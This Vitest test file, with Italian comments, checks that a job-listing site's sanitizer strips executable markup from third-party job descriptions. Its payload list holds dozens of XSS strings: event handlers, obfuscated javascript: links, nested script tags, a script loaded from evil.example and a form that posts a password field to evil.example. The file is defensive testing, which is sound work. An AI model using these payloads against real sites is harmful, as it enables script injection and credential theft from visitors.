/**
 * Le description di terzi (crawler, ATS) non possono eseguire codice né nelle
 * pagine job statiche né nella SPA.
 *
 * Prima del 2026-10-02 i rami passthrough di `toHtml.ts` restituivano l'HTML
 * dell'ATS quasi verbatim (`<p onmouseover>`, `<div onclick>`, `<svg onload>`
 * e `<a href="javascript:…">` arrivavano nella pagina statica), e
 * `JobExpiredView` iniettava `descriptionByLocale` grezza con
 * `dangerouslySetInnerHTML`.
 *
 * L'oracolo è il DOM, non la stringa: l'output viene fatto parsare da jsdom
 * come lo farebbe il browser, e si verifica che nessun elemento abbia un
 * attributo `on*`, che non esistano elementi eseguibili o incorporati e che
 * ogni `href` abbia uno schema ammesso.
 */
import { describe, expect, it } from 'vitest';
import { readFileSync } from 'node:fs';
import path from 'node:path';

import {
  inlineTextToHtml,
  jobDescriptionTextToHtml,
} from '../../build-plugins/shared/jobDescription/toHtml';
import {
  safeHref,
  sanitizeJobDescriptionHtml,
} from '../../build-plugins/shared/jobDescription/sanitizeHtml';
import { renderJobDescriptionContent } from '../../build-plugins/shared/jobDescriptionContent';
import { createAuditor } from '../../scripts/audit-link-anchor-text.mjs';

const ROOT = path.resolve(import.meta.dirname, '..', '..');

/** Payload → testo che deve sopravvivere (vuoto se nessuno). */
const PAYLOADS: ReadonlyArray<readonly [string, string]> = [
  ['<p>Ruolo</p><img src=x onerror=alert(1)>', 'Ruolo'],
  ['<p>Ruolo</p><img src="x" onerror="alert(1)"/>', 'Ruolo'],
  ['<p>Ruolo</p><script>alert(1)</script>', 'Ruolo'],
  ['<p>Ruolo</p><SCRIPT SRC=//evil.example/x.js></SCRIPT>', 'Ruolo'],
  ['<p>Ruolo</p><script>alert(1)', 'Ruolo'],
  ['<p><a href="javascript:alert(1)">Candidati</a></p>', 'Candidati'],
  ['<p><a href="JaVaScRiPt:alert(1)">Candidati</a></p>', 'Candidati'],
  ['<p><a href=javascript:alert(1)>Candidati</a></p>', 'Candidati'],
  ['<p><a href=" javascript:alert(1)">Candidati</a></p>', 'Candidati'],
  ['<p><a href="java\tscript:alert(1)">Candidati</a></p>', 'Candidati'],
  ['<p><a href="&#106;avascript:alert(1)">Candidati</a></p>', 'Candidati'],
  ['<p><a href="&#x6A;avascript&colon;alert(1)">Candidati</a></p>', 'Candidati'],
  ['<p><a href="vbscript:msgbox(1)">Candidati</a></p>', 'Candidati'],
  ['<p><a href="data:text/html,<script>alert(1)</script>">Candidati</a></p>', 'Candidati'],
  ['<p>Ruolo</p><iframe src="javascript:alert(1)"></iframe>', 'Ruolo'],
  ['<p>Ruolo</p><iframe srcdoc="<script>alert(1)</script>">', 'Ruolo'],
  ['<p onmouseover="alert(1)">Ruolo</p>', 'Ruolo'],
  ['<p>Ruolo</p><div onclick="alert(1)">Sede</div>', 'Sede'],
  ['<p>Ruolo<svg onload=alert(1)></p>', 'Ruolo'],
  ['<p>Ruolo</p><svg><script>alert(1)</script></svg>', 'Ruolo'],
  ['<p>Ruolo</p><math><mi xlink:href="javascript:alert(1)">x</mi></math>', 'Ruolo'],
  ['<p>Ruolo</p><body onload=alert(1)>', 'Ruolo'],
  ['<p>Ruolo</p><details open ontoggle=alert(1)>Dettagli</details>', 'Dettagli'],
  ['<p>Ruolo</p><object data="javascript:alert(1)"></object><embed src="x.swf">', 'Ruolo'],
  ['<p>Ruolo</p><base href="https://evil.example/">', 'Ruolo'],
  ['<p>Ruolo</p><meta http-equiv="refresh" content="0;url=javascript:alert(1)">', 'Ruolo'],
  ['<p>Ruolo</p><form action="https://evil.example/"><input name="pw"><button>Invia</button></form>', 'Invia'],
  ['<p>Ruolo</p><style>body{display:none}</style>', 'Ruolo'],
  ['<p style="position:fixed;inset:0;z-index:9999">Ruolo</p>', 'Ruolo'],
  ['<p>Ruolo</p><!--><img src=x onerror=alert(1)>-->', 'Ruolo'],
  ['<p title="</p><img src=x onerror=alert(1)>">Ruolo</p>', 'Ruolo'],
  ['<p>Ruolo</p><scr<script>ipt>alert(1)</script>', 'Ruolo'],
  ['<p>Ruolo</p><scr<script></script>ipt>alert(1)</scr<script></script>ipt>', 'Ruolo'],
  ['<strong onclick="alert(1)">Ruolo</strong> <a href="https://example.com/job" onclick="x">Candidati</a>', 'Candidati'],
];

const ALLOWED_HREF = /^(?:https?:|mailto:|tel:|\/|#)/i;

/** Parse as a browser would and report everything executable or embedded. */
function domFindings(html: string): string[] {
  const host = document.createElement('div');
  host.innerHTML = html;
  const findings: string[] = [];
  for (const el of Array.from(host.querySelectorAll('*'))) {
    const tag = el.tagName.toLowerCase();
    if (['script', 'iframe', 'img', 'svg', 'math', 'object', 'embed', 'base', 'meta', 'link', 'style', 'form', 'input', 'frame'].includes(tag)) {
      findings.push(`<${tag}>`);
    }
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      if (tag === 'a' && name === 'href') {
        if (!ALLOWED_HREF.test(el.getAttribute('href') ?? '')) findings.push(`href=${attr.value}`);
        continue;
      }
      findings.push(`<${tag} ${name}>`);
    }
  }
  return findings;
}

function textOf(html: string): string {
  const host = document.createElement('div');
  host.innerHTML = html;
  return host.textContent ?? '';
}

describe('nessun payload sopravvive, su tutti e tre gli ingressi', () => {
  const renderers: ReadonlyArray<readonly [string, (s: string) => string]> = [
    ['sanitizeJobDescriptionHtml', sanitizeJobDescriptionHtml],
    ['jobDescriptionTextToHtml (pagine statiche e JobExpiredView)', jobDescriptionTextToHtml],
    ['inlineTextToHtml (bullet e sezioni delle pagine statiche)', inlineTextToHtml],
  ];
  for (const [name, render] of renderers) {
    it.each(PAYLOADS)(`${name}: %s`, (payload, keep) => {
      const out = render(payload);
      expect(domFindings(out), out).toEqual([]);
      if (keep) expect(textOf(out)).toContain(keep);
    });
  }
});

describe('sanitizeJobDescriptionHtml — cosa resta', () => {
  it('ricostruisce i tag ammessi senza attributi e conserva il testo', () => {
    expect(sanitizeJobDescriptionHtml('<P CLASS="x" style="color:red">Ruolo <STRONG lang=de>80%</STRONG></P>'))
      .toBe('<p>Ruolo <strong>80%</strong></p>');
  });

  it('tiene solo href sicuri su <a>, con & e " neutralizzati', () => {
    expect(sanitizeJobDescriptionHtml('<a href="https://example.com/?a=1&amp;b=2" target="_blank" rel="x">Candidati</a>'))
      .toBe('<a href="https://example.com/?a=1&amp;b=2">Candidati</a>');
    expect(sanitizeJobDescriptionHtml("<a href='mailto:hr@example.com'>Scrivi</a>"))
      .toBe('<a href="mailto:hr@example.com">Scrivi</a>');
    expect(sanitizeJobDescriptionHtml('<a href="/cerca-lavoro-ticino/">Altre offerte</a>'))
      .toBe('<a href="/cerca-lavoro-ticino/">Altre offerte</a>');
  });

  it('scarta i wrapper non ammessi tenendone il testo', () => {
    expect(sanitizeJobDescriptionHtml('<section><font color=red>Benefit</font></section>')).toBe('Benefit');
  });

  it('escapa ogni < che non apre un tag riconosciuto', () => {
    expect(sanitizeJobDescriptionHtml('<p>Salario < 100k e 3<5</p>')).toBe('<p>Salario &lt; 100k e 3&lt;5</p>');
  });

  it('lascia invariati testo semplice ed entità', () => {
    const plain = 'Salario &amp; benefit — 80-100% · Lugano';
    expect(sanitizeJobDescriptionHtml(plain)).toBe(plain);
    expect(sanitizeJobDescriptionHtml('<p>&lt;script&gt;</p>')).toBe('<p>&lt;script&gt;</p>');
  });

  it('non riequilibra il markup malformato (il flusso visibile resta quello della fonte)', () => {
    expect(sanitizeJobDescriptionHtml('<p>uno<li>due</p>')).toBe('<p>uno<li>due</p>');
  });

  it('è idempotente', () => {
    for (const [payload] of PAYLOADS) {
      const once = sanitizeJobDescriptionHtml(payload);
      expect(sanitizeJobDescriptionHtml(once), payload).toBe(once);
    }
  });
});

describe('safeHref', () => {
  it.each([
    'javascript:alert(1)', ' JAVASCRIPT:alert(1)', 'java\nscript:alert(1)', '&#106;avascript:alert(1)',
    'java&Tab;script:alert(1)', 'java&NewLine;script:alert(1)', '&#106avascript:alert(1)',
    '&#x6a;avascript:alert(1)', 'javascript&colon;alert(1)', 'data:text/html,x', 'vbscript:x', 'file:///etc/passwd', '',
  ])('rifiuta %j', (href) => {
    expect(safeHref(href)).toBeNull();
  });

  it.each([
    ['https://example.com/a?b=1&c=2', 'https://example.com/a?b=1&amp;c=2'],
    ['http://example.com/', 'http://example.com/'],
    ['mailto:hr@example.com', 'mailto:hr@example.com'],
    ['tel:+41911234567', 'tel:+41911234567'],
    ['/en/find-jobs-ticino/', '/en/find-jobs-ticino/'],
    ['#apply', '#apply'],
    ['/a&lt;b?x=1&amp;y=2', '/a&lt;b?x=1&amp;y=2'],
    ['/a&amp;lt;b', '/a&amp;lt;b'],
    ['/unicode/&#x10ffff;', `/unicode/${String.fromCodePoint(0x10ffff)}`],
    ['/unicode/&#1114111', `/unicode/${String.fromCodePoint(0x10ffff)}`],
  ])('accetta %j', (href, expected) => {
    expect(safeHref(href)).toBe(expected);
  });
});

describe('JobExpiredView non inietta più la description grezza', () => {
  const src = readFileSync(path.join(ROOT, 'components/community/JobExpiredView.tsx'), 'utf8');

  it('passa dal serializer condiviso con le pagine statiche', () => {
    expect(src).toContain("import { renderJobDescriptionContent } from '@/build-plugins/shared/jobDescriptionContent';");
    expect(src).toMatch(/const descriptionHtml = renderJobDescriptionContent\(description, locale,/);
    expect(src).toContain('dangerouslySetInnerHTML={{ __html: descriptionHtml }}');
    expect(src).not.toMatch(/__html:\s*description\s*\}/);
    const rendered = document.createElement('div');
    rendered.innerHTML = renderJobDescriptionContent(PAYLOADS.map(([payload]) => payload).join('\n'), 'it');
    expect(domFindings(rendered.querySelector('[data-job-description-full]')!.innerHTML)).toEqual([]);
  });
});

describe('complete source links have descriptive destinations', () => {
  it('repairs the real auditor violation without discarding the source link or surrounding text', () => {
    const input = '<p>All our code is open source: <a href="https://proton.me/community/open-source">here</a>. Read about our impact.</p>';
    const before = createAuditor({ ledger: null, sampleRate: 1 });
    before.collect('/tmp/job-detail/index.html', input);
    expect(before.report().passed).toBe(false);
    const rendered = renderJobDescriptionContent(input, 'en');
    const after = createAuditor({ ledger: null, sampleRate: 1 });
    after.collect('/tmp/job-detail/index.html', rendered);
    expect(after.report().passed).toBe(true);
    expect(textOf(rendered)).toContain('All our code is open source: here (proton.me/community/open-source). Read about our impact.');
  });

  it.each(['here', 'qui', 'mehr', 'en savoir plus', 'h&#101;re', '&nbsp;here&nbsp;'])('retains %s and the safe source destination', (label) => {
    const input = `<p>Open source: <a href="https://proton.me/community/open-source?ref=job">${label}</a></p>`;
    const output = sanitizeJobDescriptionHtml(input);
    expect(output).toContain(`${label} (proton.me/community/open-source)</a>`);
    expect(output).toContain('href="https://proton.me/community/open-source?ref=job"');
    expect(sanitizeJobDescriptionHtml(output)).toBe(output);
    expect(domFindings(output)).toEqual([]);
    const auditor = createAuditor({ ledger: null, sampleRate: 1 });
    auditor.collect('/tmp/job-detail/index.html', output);
    expect(auditor.report().passed).toBe(true);
  });

  it('preserves meaningful labels and escapes destination labels without adding credentials', () => {
    expect(sanitizeJobDescriptionHtml('<a href="/privacy/">Privacy policy</a>'))
      .toBe('<a href="/privacy/">Privacy policy</a>');
    const output = sanitizeJobDescriptionHtml('<a href="https://user:pass@example.com/%3Cscript%3E">here</a>');
    expect(output).toContain('here (example.com/%3Cscript%3E)');
    expect(domFindings(output)).toEqual([]);
    expect(sanitizeJobDescriptionHtml('<a href="javascript:alert(1)">here</a>')).not.toContain('href=');
    expect(sanitizeJobDescriptionHtml('<a href="/a&lt;b?x=1&amp;y=2">here</a>'))
      .toBe('<a href="/a&lt;b?x=1&amp;y=2">here (/a&lt;b?x=1&amp;y=2)</a>');
  });
});
